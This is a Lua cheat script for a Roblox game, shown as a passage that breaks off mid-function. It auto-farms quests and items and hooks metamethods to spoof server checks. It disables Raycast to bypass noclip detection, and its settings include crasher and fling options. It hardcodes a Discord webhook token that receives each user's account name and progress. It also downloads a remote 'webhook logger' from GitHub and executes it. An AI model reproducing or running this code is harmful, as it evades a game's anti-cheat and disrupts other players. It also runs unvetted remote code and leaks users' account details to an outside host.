-- SecretClub GUI 
-- Created by Piscar&Zamorozka
local lines = {
    "",
    " ####  #####  ####  ####  #####  ##### ",
    "#     #     ##     # #  #  #      #    ",
    " #### #####  #     #####  #####  #     ",
    "    # #     ##     # #  #  #      #    ",
    "####  #####  ####  # #  #  #####  #    ",
    "",
    " ####  #     #   # ####  ",
    "#     #     #   # #   # ",
    "#     #     #   # ####  ",
    "#     #     #   # #   # ",
    " ####  ##### #### ####  ",
    ""
}

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Stats = game:GetService("Stats")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Executor Detection
local function getExecutorName()
    if identifyexecutor then
        local s, n = pcall(identifyexecutor)
        if s and n then return n end
    end
    if KRNL_LOADED then return "KRNL" end
    if syn then return "Synapse X" end
    if Fluxus then return "Fluxus" end
    if iselectron then return "Electron" end
    if getexecutorname then
        local s, n = pcall(getexecutorname)
        if s and n then return n end
    end
    return "Unknown"
end

local EXECUTOR_NAME = getExecutorName()

-- Compatibility
if not setclipboard then
    setclipboard = toclipboard or writeclipboard or function(t) print(t) end
end
if not getgenv then getgenv = function() return _G end end

-- ========================================
-- AUTO FARM CONTROL (НОВОЕ)
-- ========================================
getgenv().AutoFarmEnabled = false
getgenv().scriptEnabled = true

-- ФУНКЦИЯ ПОЛНОГО ПЕРЕЗАПУСКА СКРИПТА
local function RunScript()
    task.spawn(function()
getgenv().standList =  {
    ["The World"] = true,
    ["Star Platinum"] = true,
    ["Star Platinum: The World"] = true,
    ["Crazy Diamond"] = true,
    ["King Crimson"] = true,
    ["King Crimson Requiem"] = true
}
getgenv().waitUntilCollect = 0.5 --Change this if ur getting kicked a lot
getgenv().sortOrder = "Asc" --desc for less players, asc for more
getgenv().lessPing = false --turn this on if u want lower ping servers, cant guarantee you will see same people using script, and data error 1
getgenv().autoRequiem = true --turn this on for auto requiem
getgenv().NPCTimeOut = 15 --timeout for npc not spawning
getgenv().HamonCharge = 90 --change if u want to charge hamon after every kill (around 90)
getgenv().webhook = "https://discord.com/api/webhooks/1360953041506926633/V1S5HtCFLwVOcg_8yv15bltvaJnLvuu_boi7kyvdKCFO42IySo2RnaMykkurJY5mYrJ0" --change this if u want to use ur own webhook

game:GetService("CoreGui").DescendantAdded:Connect(function(child)
    if child.Name == "ErrorPrompt" then
        local GrabError = child:FindFirstChild("ErrorMessage",true)
        repeat task.wait() until GrabError.Text ~= "Label"
        local Reason = GrabError.Text
        if Reason:match("kick") or Reason:match("You") or Reason:match("conn") or Reason:match("rejoin") then
            game:GetService("TeleportService"):Teleport(2809202155, game:GetService("Players").LocalPlayer)
        end
    end
end)

repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer and game.Players.LocalPlayer.Character

local LocalPlayer = game.Players.LocalPlayer
local Character = LocalPlayer.Character
repeat task.wait() until Character:FindFirstChild("RemoteEvent") and Character:FindFirstChild("RemoteFunction")
local RemoteFunction, RemoteEvent = Character.RemoteFunction, Character.RemoteEvent
local HRP = Character.PrimaryPart
local part
local dontTPOnDeath = true

if LocalPlayer.PlayerStats.Level.Value == 50 then while true do print("Level 50, Auto pres disabled") task.wait(9999999) end end

if not LocalPlayer.PlayerGui:FindFirstChild("HUD") then
    print("I FOUND IT")
    local HUD = game:GetService("ReplicatedStorage").Objects.HUD:Clone()
    HUD.Parent = LocalPlayer.PlayerGui
end

print("I DID FOUND IT, MAYBE IT WILL WORK?")
RemoteEvent:FireServer("PressedPlay")

if LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1") then
    LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1"):Destroy()
end

if LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen") then
    LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen"):Destroy()
end

task.spawn(function()
    if game.Lighting:WaitForChild("DepthOfField", 10) then
        game.Lighting.DepthOfField:Destroy()
    end
end)

workspace.Map.IMPORTANT.OceanFloor.OceanFloor_Sand_6.Size = Vector3.new(2048, 89, 2048)
workspace.Map.IMPORTANT.OceanFloor.OceanFloor_Sand_4.Size = Vector3.new(2048, 89, 2048)

-- data
local Data = { }
local File = pcall(function()
    Data = game:GetService('HttpService'):JSONDecode(readfile("AutoPres3_"..LocalPlayer.Name..".txt"))
end)

if not File and LocalPlayer.PlayerStats.Level.Value ~= 50 then
    Data = {
        ["Time"] = tick(),
        ["Prestige"] = LocalPlayer.PlayerStats.Prestige.Value,
        ["Level"] = LocalPlayer.PlayerStats.Level.Value
    }
    writefile("AutoPres3_"..LocalPlayer.Name..".txt", game:GetService('HttpService'):JSONEncode(Data))
end

-- start
local lastTick = tick()
local function SendWebhook(msg)
    local url = getgenv().webhook

    local data;
    data = {
        ["embeds"] = {
            {
                ["title"] = "SecretClub - Auto Prestige",
                ["description"] = msg,
                ["type"] = "rich",
                ["color"] = tonumber(0x7269ff),
            }
        }
    }

    repeat task.wait() until data
    local newdata = game:GetService("HttpService"):JSONEncode(data)


    local headers = {
        ["Content-Type"] = "application/json"
    }
    local request = http_request or request or HttpPost or syn.request or http.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end

SendWebhook("Loading SecretClub - Auto Prestige\nCurrent level: `"..LocalPlayer.PlayerStats.Level.Value.."`\nCurrent prestige: `"..LocalPlayer.PlayerStats.Prestige.Value.."`\nTime since start: `" .. (tick() - Data["Time"])/60 .. " minutes`")

local itemHook;
itemHook = hookfunction(getrawmetatable(game.Players.LocalPlayer.Character.HumanoidRootPart.Position).__index, function(p,i)
    if getcallingscript().Name == "ItemSpawn" and i:lower() == "magnitude" then
        return 0
    end
    return itemHook(p,i)
end)

local Hook;
Hook = hookmetamethod(game, '__namecall', newcclosure(function(self, ...)
    local args = {...}
    local namecallmethod =  getnamecallmethod()

    if namecallmethod == "InvokeServer" then
        if args[1] == "idklolbrah2de" then
            return "  ___XP DE KEY"
        end
    end

    return Hook(self, ...)
end))

 local function Teleport()
    while task.wait() do
       if not getgenv().scriptEnabled then break end
       pcall(function()
        if getgenv().lessPing then
            game:GetService("TeleportService"):Teleport(2809202155, game:GetService("Players").LocalPlayer)
     
            game:GetService("TeleportService").TeleportInitFailed:Connect(function()
                 game:GetService("TeleportService"):Teleport(2809202155, game:GetService("Players").LocalPlayer)
            end)
            
            repeat task.wait() until game.JobId ~= game.JobId
        end

       TPReturner()
       if foundAnything ~= "" then
          TPReturner()
       end
       end)
    end
 end

part = Instance.new("Part")
part.Parent = workspace
part.Anchored = true
part.Size = Vector3.new(25,1,25)
part.Position = Vector3.new(500, 2000, 500)

--// Obtaining Stand/Farming items //--
local function findItem(itemName)
    local ItemsDict = {
        ["Position"] = {},
        ["ProximityPrompt"] = {},
        ["Items"] = {}
    }

    for _,item in pairs(game:GetService("Workspace")["Item_Spawns"].Items:GetChildren()) do
        if item:FindFirstChild("MeshPart") and item.ProximityPrompt.ObjectText == itemName then
            if item.ProximityPrompt.MaxActivationDistance == 8 then
                table.insert(ItemsDict["Items"], item.ProximityPrompt.ObjectText)
                table.insert(ItemsDict["ProximityPrompt"], item.ProximityPrompt)
                table.insert(ItemsDict["Position"], item.MeshPart.CFrame)
            else
                print("FAKE?")
            end
        end
    end
    return ItemsDict
end

--count amount of items for checking if full of item
local function countItems(itemName)
    local itemAmount = 0

    for _,item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if item.Name == itemName then
            itemAmount += 1;
        end
    end

    print(itemAmount)
    return itemAmount
end

--uses item, use amount to specify what worthiness
local function useItem(aItem, amount)
    if not getgenv().scriptEnabled then return end
    local item = LocalPlayer.Backpack:WaitForChild(aItem, 5)

    if not item then
        Teleport()
    end

    if amount then
        LocalPlayer.Character.Humanoid:EquipTool(item)
        LocalPlayer.Character:WaitForChild("RemoteFunction"):InvokeServer("LearnSkill",{["Skill"] = "Worthiness ".. amount,["SkillTreeType"] = "Character"})
        repeat item:Activate() task.wait() until LocalPlayer.PlayerGui:FindFirstChild("DialogueGui")
        firesignal(LocalPlayer.PlayerGui:WaitForChild("DialogueGui").Frame.ClickContinue.MouseButton1Click)
        firesignal(LocalPlayer.PlayerGui:WaitForChild("DialogueGui").Frame.Options:WaitForChild("Option1").TextButton.MouseButton1Click)
        firesignal(LocalPlayer.PlayerGui:WaitForChild("DialogueGui").Frame.ClickContinue.MouseButton1Click)
		repeat task.wait() until LocalPlayer.PlayerGui:WaitForChild("DialogueGui").Frame.DialogueFrame.Frame.Line001.Container.Group001.Text == "You"
		firesignal(LocalPlayer.PlayerGui:WaitForChild("DialogueGui").Frame.ClickContinue.MouseButton1Click)
    end
end

--main function (entrypoint) of standfarm
local function attemptStandFarm()
    if not getgenv().scriptEnabled then return end
    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(500, 2010, 500)
    
    if LocalPlayer.PlayerStats.Stand.Value == "None" then
        print("DEBUG CHECK, USING MYSTERIOUS ARROW")
        useItem("Mysterious Arrow", "II")
        repeat task.wait() until LocalPlayer.PlayerStats.Stand.Value ~= "None"

        if not getgenv().standList[LocalPlayer.PlayerStats.Stand.Value] then
            print("DEBUG CHECK, USING ROKAKAKA")
            useItem("Rokakaka", "II")
        elseif getgenv().standList[LocalPlayer.PlayerStats.Stand.Value] then
            SendWebhook("Got `".. LocalPlayer.PlayerStats.Stand.Value .. "` stand")
            dontTPOnDeath = true
            Teleport()
        end

    elseif not getgenv().standList[LocalPlayer.PlayerStats.Stand.Value] then
        print("DEBUG CHECK, USING ROKAKAKA TO CLEAR STAND")
        useItem("Rokakaka", "II")
    end
end


--teleport not to get caught
local function getitem(item, itemIndex)
    if not getgenv().scriptEnabled then return end
    local gotItem = false
    local timeout = getgenv().waitUntilCollect + 5

    if Character:FindFirstChild("SummonedStand") then
        if Character:FindFirstChild("SummonedStand").Value then
            RemoteFunction:InvokeServer("ToggleStand", "Toggle")
        end
    end

    LocalPlayer.Backpack.ChildAdded:Connect(function()
        gotItem = true
    end)
    
    task.spawn(function()
        while not gotItem do
            if not getgenv().scriptEnabled then break end
            task.wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = item["Position"][itemIndex] - Vector3.new(0,10,0)
        end
    end)

    task.wait(getgenv().waitUntilCollect)

    task.spawn(function()
        fireproximityprompt(item["ProximityPrompt"][itemIndex])
        
        local screenGui = LocalPlayer.PlayerGui:WaitForChild("ScreenGui",5)
        
        if not screenGui then
            return
        end

        local screenGuiPart = screenGui:WaitForChild("Part")
        for _, button in pairs(screenGuiPart:GetDescendants()) do
            if button:FindFirstChild("Part") then
                if button:IsA("ImageButton") and button:WaitForChild("Part").TextColor3 == Color3.new(0, 1, 0) then
                    repeat
                        firesignal(button.MouseEnter)
                        firesignal(button.MouseButton1Up)
                        firesignal(button.MouseButton1Click)
                        firesignal(button.Activated)
                        task.wait()
                    until not LocalPlayer.PlayerGui:FindFirstChild("ScreenGui")
                end
            end
        end
    end)
    
    task.spawn(function()
        for i=timeout, 1, -1 do
            task.wait(1)
        end

        if not gotItem then
            gotItem = true
            return
        end
    end)


    while not gotItem do
        if not getgenv().scriptEnabled then break end
        task.wait()
    end
end

--farm item with said name and amount
local function farmItem(itemName, amount)
    if not getgenv().scriptEnabled then return end
    local items = findItem(itemName)
    local amountFirst = countItems(itemName) == amount

    for itemIndex, _ in pairs(items["Position"]) do
        if not getgenv().scriptEnabled then break end
        if countItems(itemName) == amount or amountFirst then
            print("SUCCESSFULLY BROKE")
            break
        else
            getitem(items, itemIndex)
        end
    end
    
    return true
end

--// End Dialogue Func //--
local function endDialogue(NPC, Dialogue, Option)
    local dialogueToEnd = {
        ["NPC"] = NPC,
        ["Dialogue"] = Dialogue,
        ["Option"] = Option
     }
    RemoteEvent:FireServer("EndDialogue", dialogueToEnd)
end

--// End Storyline Dialogue Func //--
local function storyDialogue()
    local Quest =
    {
    ["Storyline"] = {"#1", "#1", "#1", "#2", "#3", "#3", "#3", "#4", "#5", "#6", "#7", "#8", "#9", "#10", "#11", "#11", "#12", "#14"},
    ["Dialogue"] = {"Dialogue2", "Dialogue6", "Dialogue6", "Dialogue3", "Dialogue3", "Dialogue3", "Dialogue6", "Dialogue3", "Dialogue5", "Dialogue5", "Dialogue5", "Dialogue4", "Dialogue7", "Dialogue6", "Dialogue8", "Dialogue11", "Dialogue3", "Dialogue2"}
    }
    
    for counter = 1, 18, 1 do
       RemoteEvent:FireServer("EndDialogue", {["NPC"] = "Storyline".. " " .. Quest["Storyline"][counter],["Dialogue"] = Quest["Dialogue"][counter],["Option"] = "Option1"})
    end
end

local function killNPC(npcName, playerDistance, dontDestroyOnKill, extraParameters)
    if not getgenv().scriptEnabled then return false end
    print("DEBUG CHECK 1", npcName, playerDistance, dontDestroyOnKill, extraParameters)

	local NPC = workspace.Living:WaitForChild(npcName,getgenv().NPCTimeOut)
	local beingTargeted = true
    local doneKilled = false
	local deadCheck

    if not NPC then
        Teleport()
    end

    local function setStandMorphPosition()
        pcall(function()
            if LocalPlayer.PlayerStats.Stand.Value == "None" then
                HRP.CFrame = NPC.HumanoidRootPart.CFrame - Vector3.new(0, 5, 0)
                return
            end

            if not Character:FindFirstChild("SummonedStand").Value or not Character:FindFirstChild("StandMorph") then
                RemoteFunction:InvokeServer("ToggleStand", "Toggle")
                return
            end

            Character.StandMorph.PrimaryPart.CFrame = NPC.HumanoidRootPart.CFrame + NPC.HumanoidRootPart.CFrame.lookVector * -1.1
            HRP.CFrame = Character.StandMorph.PrimaryPart.CFrame + Character.StandMorph.PrimaryPart.CFrame.lookVector - Vector3.new(0, playerDistance, 0)
            
            if not Character:FindFirstChild("FocusCam") then
                local FocusCam = Instance.new("ObjectValue", Character)
                FocusCam.Name = "FocusCam"
                FocusCam.Value = Character.StandMorph.PrimaryPart
            end
            
            if Character:FindFirstChild("FocusCam") and Character.FocusCam.Value ~= Character.StandMorph.PrimaryPart then
                Character.FocusCam.Value = Character.StandMorph.PrimaryPart
            end
        end)
    end

    local function HamonCharge()
        if not Character:FindFirstChild("Hamon") then
            return
        end

        if Character.Hamon.Value <= getgenv().HamonCharge then
            RemoteFunction:InvokeServer("AssignSkillKey", {["Type"] = "Spec",["Key"] = "Enum.KeyCode.L",["Skill"] = "Hamon Charge"})
            Character.RemoteEvent:FireServer("InputBegan", {["Input"] = Enum.KeyCode.L})
        end
    end

    local function BlockBreaker()
        if not NPC or NPC.Parent == nil then
            return
        end
    
        if game:GetService("CollectionService"):HasTag(NPC, "Blocking") then
            RemoteEvent:FireServer("InputBegan", {["Input"] = Enum.KeyCode.R})
        elseif NPC.Humanoid.Health <= 1 then
            task.spawn(function()
                task.wait(5)
                if NPC then
                    RemoteFunction:InvokeServer("Attack", "m1")
                end
            end)
        elseif NPC.Humanoid.Health >= 1 then
            RemoteFunction:InvokeServer("Attack", "m1")
        end
    end
    

    deadCheck = LocalPlayer.PlayerGui.HUD.Main.DropMoney.Money.ChildAdded:Connect(function(child)
        local number = tonumber(string.match(child.Name,"%d+"))

        if number and NPC then
            doneKilled = true

            deadCheck:Disconnect()

            if not dontDestroyOnKill then
                NPC:Destroy()
            end
        end
    end)

    while beingTargeted do
        if not getgenv().scriptEnabled then 
            deadCheck:Disconnect()
            break 
        end
        task.wait()
        if not NPC:FindFirstChild("HumanoidRootPart") then
            deadCheck:Disconnect()
            beingTargeted = false
        end
    
        if extraParameters then
            extraParameters()
        end
    
        task.spawn(setStandMorphPosition)
        task.spawn(HamonCharge)
        task.spawn(BlockBreaker)
    end
    
    
    print(doneKilled)
    return doneKilled
end 

local function checkPrestige(level, prestige)
    if (level == 35 and prestige == 0) or (level == 40 and prestige == 1) or (level == 45 and prestige == 2) then
        SendWebhook("@everyone Congratulations you have prestiged!\nTook around `" ..
        (tick() - Data["Time"]) / 60 .. " minutes` or `" .. (tick() - Data["Time"]) / 3600 ..
        " hours` to go from `Prestige " .. Data["Prestige"] .. ", Level " .. Data["Level"] ..
        "`, to `Prestige " .. tostring(prestige + 1) .. ", Level 1!`"
        )
        endDialogue("Prestige", "Dialogue2", "Option1")
        return true
    else
        return false
    end
end

local function allocateSkills() --this should allocate the destructive shit stuff
    task.spawn(function()
        RemoteFunction:InvokeServer("LearnSkill", {["Skill"] = "Destructive Power V",["SkillTreeType"] = "Stand"})
        RemoteFunction:InvokeServer("LearnSkill", {["Skill"] = "Destructive Power IV",["SkillTreeType"] = "Stand"})
        RemoteFunction:InvokeServer("LearnSkill", {["Skill"] = "Destructive Power III",["SkillTreeType"] = "Stand"})
        RemoteFunction:InvokeServer("LearnSkill", {["Skill"] = "Destructive Power II",["SkillTreeType"] = "Stand"})
        RemoteFunction:InvokeServer("LearnSkill", {["Skill"] = "Destructive Power I",["SkillTreeType"] = "Stand"})
        
        -- Убрана автоматическая покупка навыков Хамона
    end)
end

local function autoStory()
    if not getgenv().scriptEnabled then return end
    local questPanel = LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests
    local repeatCount = 0
    allocateSkills()

    if LocalPlayer.PlayerStats.Level.Value >= 25 and LocalPlayer.PlayerStats.Prestige.Value >= 1 and LocalPlayer.Backpack:FindFirstChild("Requiem Arrow") and (LocalPlayer.PlayerStats.Stand.Value == "King Crimson" or LocalPlayer.PlayerStats.Stand.Value == "Star Platinum") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(500, 2010, 500)
        local oldStand = LocalPlayer.PlayerStats.Stand.Value
        useItem("Requiem Arrow", "V")
        repeat task.wait() until LocalPlayer.PlayerStats.Stand.Value ~= oldStand
        autoStory()
    end
        
    while #questPanel:GetChildren() < 2 and repeatCount < 1000 do
        if not getgenv().scriptEnabled then break end
        if not questPanel:FindFirstChild("Take down 3 vampires") then
            SendWebhook("Account: `" .. LocalPlayer.Name .. "`\nTook around: `".. (tick() - lastTick).. " seconds` to complete a quest")
            lastTick = tick()
            endDialogue("William Zeppeli", "Dialogue4", "Option1")
        end
    
        LocalPlayer.QuestsRemoteFunction:InvokeServer({[1] = "ReturnData"})
        storyDialogue()
        task.wait(0.01)
        repeatCount = repeatCount + 1
    end
    

    if repeatCount >= 1000 then
        Teleport()
    end

    if questPanel:FindFirstChild("Help Giorno by Defeating Security Guards") then
        if not getgenv().scriptEnabled then return end
        print('SECURITY GUARD')
        SendWebhook("Killing Security Guard `" .. LocalPlayer.PlayerStats.QuestProgress.Value.."/"..LocalPlayer.PlayerStats.QuestMaxProgress.Value .."`")
        if killNPC("Security Guard", 15) then
            task.wait(1)
            storyDialogue()
            autoStory()
        else
            autoStory()
        end

    elseif not getgenv().standList[LocalPlayer.PlayerStats.Stand.Value] and LocalPlayer.PlayerStats.Level.Value >= 3 and dontTPOnDeath then
        if not getgenv().scriptEnabled then return end
        print('NO STAND?')
        task.wait(5)
    
        farmItem("Rokakaka", 25)
        farmItem("Mysterious Arrow", 25)

        if countItems("Mysterious Arrow") >= 25 and countItems("Mysterious Arrow") >= 25 then
            print("MAX ARROW AND ROKA, GOT")
            print("ATTEMPTING TO STAND FARM")
            dontTPOnDeath = false
            attemptStandFarm()
        else
            Teleport()
        end
    
    elseif questPanel:FindFirstChild("Defeat Leaky Eye Luca") and getgenv().standList[LocalPlayer.PlayerStats.Stand.Value] then
        if not getgenv().scriptEnabled then return end
        print("LEAKY EYE LUCA")
        SendWebhook("Killing `Leaky Eye Luca`")
        if killNPC("Leaky Eye Luca", 15) then
            task.wait(1)
            storyDialogue()
            autoStory()
        else
            autoStory()
        end

    elseif questPanel:FindFirstChild("Defeat Bucciarati") then
        if not getgenv().scriptEnabled then return end
        print("BUCCIARATI")
        SendWebhook("Killing `Bucciarati`")

        if killNPC("Bucciarati", 15) then
            task.wait(1)
            storyDialogue()
            autoStory()
        else
            autoStory()
        end

    elseif questPanel:FindFirstChild("Collect $5,000 To Cover For Popo's Real Fortune") then
        if not getgenv().scriptEnabled then return end
        print("WAH WAH I DONT HAVE ENOUGH MONEY")
        if LocalPlayer.PlayerStats.Money.Value < 5000 then
            SendWebhook("Collecting `$5000`")
            local function collectAndSell(toolName, amount)
                if countItems(toolName) <= amount then
                    farmItem(toolName, amount)
                    Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild(toolName))
                    endDialogue("Merchant", "Dialogue5", "Option2")
                    storyDialogue()
                    autoStory()
                end

                if LocalPlayer.PlayerStats.Money.Value < 5000 then
                    storyDialogue()
                    autoStory()
                end
            end
            task.wait(10)
            
            collectAndSell("Mysterious Arrow", 25)
            collectAndSell("Rokakaka", 25)
            collectAndSell("Diamond", 10)
            collectAndSell("Steel Ball", 10)
            collectAndSell("Quinton's Glove", 10)
            collectAndSell("Ribcage Of The Saint's Corpse", 10)
            collectAndSell("Ancient Scroll", 10)
        end
        autoStory()

    elseif questPanel:FindFirstChild("Defeat Fugo And His Purple Haze") then
        if not getgenv().scriptEnabled then return end
        print("FUGO")
        SendWebhook("Killing `Fugo`")
        if killNPC("Fugo", 15) then
            task.wait(1)
            storyDialogue()
            autoStory()
        else
            autoStory()
        end

    elseif questPanel:FindFirstChild("Defeat Pesci") then
        if not getgenv().scriptEnabled then return end
        print("PESCI")
        SendWebhook("Killing `Pesci`")
        if killNPC("Pesci", 15) then
            task.wait(1)
            storyDialogue()
            autoStory()
        else
            autoStory()
        end

    elseif questPanel:FindFirstChild("Defeat Ghiaccio") then
        if not getgenv().scriptEnabled then return end
        print("GHIACCIO")
        SendWebhook("Killing `Ghiaccio`")
        if killNPC("Ghiaccio", 15) then
            task.wait(1)
            storyDialogue()
            autoStory()
        else
            autoStory()
        end

    elseif questPanel:FindFirstChild("Defeat Diavolo") then
        if not getgenv().scriptEnabled then return end
        SendWebhook("Killing `Diavolo`")
        killNPC("Diavolo", 15)
        endDialogue("Storyline #14", "Dialogue7", "Option1")
        if Character:WaitForChild("Requiem Arrow", 5) then
            LocalPlayer.Character.Humanoid.Health = 0
            Teleport()
        else
            autoStory()
        end

    elseif questPanel:FindFirstChild("Take down 3 vampires") then
        if not getgenv().scriptEnabled then return end
        local function vampire()
            LocalPlayer.Character.PrimaryPart.CFrame = workspace.Living:FindFirstChild("Vampire").HumanoidRootPart.CFrame - Vector3.new(0, 15, 0)
            if not questPanel:FindFirstChild("Take down 3 vampires") then
                if (tick() - lastTick) >= 5 then
                    SendWebhook("Account: `" .. LocalPlayer.Name .. "`\nTook around: `".. (tick() - lastTick).. " seconds` to complete `Vampire Quest`")
                    lastTick = tick()
                end
                endDialogue("William Zeppeli", "Dialogue4", "Option1")
            end
        end

        killNPC("Vampire", 15, false, vampire)
        autoStory()

    elseif LocalPlayer.PlayerStats.Level.Value == 50 then
        if Character:FindFirstChild("FocusCam") then
            Character.FocusCam:Destroy()
        end

        SendWebhook(
            "**Prestige 3, Level 50 reached!**" ..
            "\nTime: `" .. (tick() - Data["Time"])/60 .. " minutes or " .. (tick() - Data["Time"])/3600 .. " hours`" ..
            "\nFrom: `Prestige: ".. Data["Prestige"]  .. ", Level " .. Data["Level"] .. "`" ..
            "\nStand: `" .. LocalPlayer.PlayerStats.Stand.Value .. "`" ..
            "\nSpec: `" .. LocalPlayer.PlayerStats.Spec.Value .. "`" ..
            "\nAccount: `" .. LocalPlayer.Name .. "`"
        )
        pcall(function()
            delfile("AutoPres3_"..LocalPlayer.Name..".txt")
        end)
    end
end

task.spawn(function()
    while task.wait(1) do
        if not getgenv().scriptEnabled then break end
        if checkPrestige(LocalPlayer.PlayerStats.Level.Value, LocalPlayer.PlayerStats.Prestige.Value) then
            print("Prestiged")
            Teleport()
        elseif LocalPlayer.PlayerStats.Level.Value == 50 then
            break
        else
            print("not able to prestige yet")
        end
    end
end)

game.Workspace.Living.ChildAdded:Connect(function(character)
    if character.Name == LocalPlayer.Name then
        if LocalPlayer.PlayerStats.Level.Value == 50 then
            print("didnt reconnect")
        else
            if dontTPOnDeath then
                Teleport()
            else
                attemptStandFarm()
            end
        end
    end
end)

LocalPlayer.PlayerStats.Level:GetPropertyChangedSignal("Value"):Connect(function()
    SendWebhook("Account: `" .. LocalPlayer.Name .. "`\nNew level: `" .. LocalPlayer.PlayerStats.Level.Value .. "`\nCurrent prestige: `" .. LocalPlayer.PlayerStats.Prestige.Value .. "`")
end)

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    for _, child in pairs(LocalPlayer.Character:GetDescendants()) do
        if child:IsA("BasePart") and child.CanCollide == true then
            child.CanCollide = false
        end
    end
end)

hookfunction(workspace.Raycast, function() -- noclip bypass
    return
end)

autoStory()
    end)
end


-- ========================================
-- WEBHOOK LOGGER LOADER (FROM GITHUB)
-- ========================================

-- ЗАМЕНИТЕ НА ВАШУ ССЫЛКУ:
local GITHUB_LOGGER_URL = "https://raw.githubusercontent.com/Piscar1/zalupa1/refs/heads/main/webhook-logger.lua"
-- Загрузка и запуск webhook логгера
task.spawn(function()
    local success, result = pcall(function()
        return loadstring(game:HttpGet(GITHUB_LOGGER_URL))()
    end)
    
    if success and result then
        result(EXECUTOR_NAME) -- Запускаем логгер
        print("[SecretClub] ✅ Webhook logger loaded from GitHub")
    else
        warn("[SecretClub] ❌ Failed to load webhook logger: " .. tostring(result))
    end
end)

-- Удаляем старый GUI
if LocalPlayer.PlayerGui:FindFirstChild("SecretClubGUI_Complete") then
    LocalPlayer.PlayerGui:FindFirstChild("SecretClubGUI_Complete"):Destroy()
end

-- Variables
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

-- ========================================
-- ТОЧНО ИЗ ВТОРОГО СКРИПТА: Variables + Settings + PilotStand + UnPilotStand
-- ========================================

local Player = game.Players.LocalPlayer
Player.CharacterAdded:Connect(function()
    task.wait(1)
    Character = Player.Character
end)

local Humanoid = Character:FindFirstChild("Humanoid") or Character:WaitForChild("Humanoid")
local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart")
local StandMorph = Character:FindFirstChild("StandMorph")
local RemoteEvent = Character:FindFirstChild("RemoteEvent") or Character:WaitForChild("RemoteEvent")
local RemoteFunction = Character:FindFirstChild("RemoteFunction") or Character:WaitForChild("RemoteFunction")
local CurrentCamera = workspace.CurrentCamera

local TempStore = Instance.new("Folder", game.ReplicatedStorage)
TempStore.Name = "TempStorage"
local StayInPilot = Instance.new("BoolValue", workspace)
StayInPilot.Value = false

getgenv().settings = {
    ["cachedbodyparts"] = {},
    ["noclip"] = false,
    ["invisenabled"] = nil,
    ["antits"] = nil,
    ["inviskey"] = Enum.KeyCode.L,
    ["oldpos"] = nil,
    ["delay"] = 0.8,
    ["crasher"] = false,
    ["customval"] = 2000,
    ["standspeed"] = 1.5,
    ["pilotjumppower"] = 1.5,
    ["hidebody"] = true,
    ["tpbodytostand"] = true,
    ["bodydistance"] = 37,
    ["pilotkey"] = Enum.KeyCode.H,
    ["currentargs"] = nil,
    ["flingtarget"] = nil,
    ["animationlist"] = {},
    ["1"] = nil,
    ["2"] = nil,
    ["3"] = nil,
    ["4"] = nil,
    ["5"] = nil,
    ["6"] = nil,
    ["7"] = nil,
    ["8"] = nil,
    ["9"] = nil,
    ["target"] = nil,
    ["attach"] = false,
    ["distancefr"] = 2,
    ["god"] = nil,
    ["kidnaptarget"] = nil,
    ["teleportpos"] = CFrame.new(0, -500, 0),
    ["movementpredictionstrength"] = 0.35,
    ["timeout"] = 1,
    ["useinvis"] = true
}

-- Stand Attach Settings (для GUI)
getgenv().AttachSettings = {
    target = nil,
    attach = false,
    distance = 2,
    height = 0,
}

-- ========================================
-- STAND PILOT (FROM vezrr & crtrz GUI)
-- ========================================
local CurrentCharacter, SummonedStand, StandHumanoid, Camera

local function UpdateIndex()
	CurrentCharacter = Player.Character
	Humanoid = CurrentCharacter:FindFirstChild("Humanoid") or CurrentCharacter:WaitForChild("Humanoid")
	SummonedStand = CurrentCharacter:FindFirstChild("SummonedStand") or CurrentCharacter:WaitForChild("SummonedStand")
	
	StandMorph = CurrentCharacter:FindFirstChild("StandMorph")
	StandHumanoid = StandMorph:FindFirstChild("AnimationController") or StandMorph:WaitForChild("AnimationController")
	
	Camera = workspace.CurrentCamera
end	


local function PilotStand()
	UpdateIndex()
	
	for i,v in workspace.Locations:GetChildren() do
		if v.Name == "Naples' Sewers" then
			v.Parent = TempStore
		end
	end

	local CameraValue = Instance.new("ObjectValue", StandMorph.Parent)
	local PilotFunctions = {["FocusCam"] = CameraValue, ["CFrame"] = CurrentCharacter.PrimaryPart.CFrame}

	CameraValue.Name = "FocusCam"
	CameraValue.Value = StandHumanoid
	
	for _,v in CurrentCharacter:GetChildren() do
		if v:IsA("BasePart") then
			v.CanCollide = false
		end
	end
	
	--//Jumping\\--
	PilotFunctions["JumpSignal"] = Humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
		if Humanoid.Jump then
	    	StandHumanoid.Jump = true
	    end
	end)
	
	--//WalkSpeed\\--
	StandHumanoid.WalkSpeed = Humanoid.WalkSpeed*settings["standspeed"]
	PilotFunctions["PilotSpeed"] = Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
	    StandHumanoid.WalkSpeed = Humanoid.WalkSpeed*settings["standspeed"]
	end)
	
	
	--//Jump Power\\--
	StandHumanoid.JumpPower = Humanoid.JumpPower*settings["pilotjumppower"]
	PilotFunctions["JumpPower"] = Humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
	    StandHumanoid.JumpPower = Humanoid.JumpPower*settings["pilotjumppower"]
	end)
	
	if not settings["hidebody"] then
		CurrentCharacter.PrimaryPart.Anchored = true
	end
	
	--//Walking\\--
	PilotFunctions["LoopTP"] = RunService.Heartbeat:Connect(function()
